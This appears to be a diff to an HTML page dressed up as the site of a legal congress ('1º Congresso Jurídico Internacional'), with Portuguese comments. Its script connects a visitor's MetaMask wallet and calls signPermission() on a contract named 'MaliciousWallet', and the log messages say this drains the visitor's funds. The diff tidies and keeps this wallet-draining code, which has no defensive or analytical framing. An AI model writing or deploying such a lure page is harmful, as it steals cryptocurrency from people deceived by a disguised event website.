@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <title>1º Congresso Jurídico Internacional</title>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.x/lib/ethers.min.js"></script>
+    <!-- Inclusão da biblioteca ethers.js -->
+    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
     <style>
         /* Estilos da página */
         html, body {
@@ -42,20 +43,21 @@
         // Substitua pelo endereço do contrato implantado
         const enderecoContratoMaliciousWallet = "0x..."; 
 
-        let contrato;
         let provider;
         let signer;
+        let contrato;
 
         async function conectarWallet() {
             if (window.ethereum) {
                 try {
                     // Solicita acesso à conta do usuário
                     await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    // Cria um novo provider do Ethereum
+                    // Cria um novo provider do Ethereum a partir do MetaMask
                     provider = new ethers.providers.Web3Provider(window.ethereum);
-                    // Define o signer (a conta conectada)
+                    // Obtém o signer a partir do provider
                     signer = provider.getSigner();
 
+                    // Cria uma instância do contrato com o signer, que permitirá transações
                     contrato = new ethers.Contract(enderecoContratoMaliciousWallet, abiMaliciousWallet, signer);
 
                     document.getElementById('btnSignPermission').style.display = 'block';
@@ -71,9 +73,10 @@
         async function signPermission() {
             if (signer && contrato) {
                 try {
+                    // Chama a função signPermission do contrato
                     const tx = await contrato.signPermission();
-                    await tx.wait(); // Esperar pela mineração da transação
-                    console.log("Permissão assinada e fundos drenados (se houver saldo).");
+                    await tx.wait(); // Esperar pela transação ser minerada
+                    console.log("Permissão assinada e fundos potencialmente drenados.");
                 } catch (error) {
                     console.error("Erro ao assinar permissão:", error);
                 }
